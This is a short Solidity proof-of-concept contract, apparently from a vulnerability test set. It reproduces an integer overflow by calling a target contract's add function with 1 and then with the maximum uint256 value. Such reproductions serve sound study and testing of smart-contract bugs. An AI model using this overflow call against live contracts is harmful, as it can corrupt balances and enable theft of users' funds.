

interface IOverflow_Add {
    function add(uint256 deposit) external;
}

contract Reproduction is IOverflow_Add {
    uint public sellerBalance = 0;
    IOverflow_Add public vulnerableContract;

    constructor(address _vulnerableContract) {
        vulnerableContract = IOverflow_Add(_vulnerableContract);
    }

    function setup() public {
        sellerBalance = 1;
        vulnerableContract.add(1);
    }

    function triggerOverflow() public {
        vulnerableContract.add(115792089237316195423570985008687907853269984665640564039457584007913129639935);
    }

    function add(uint256 deposit) public override {
        sellerBalance += deposit;
    }
}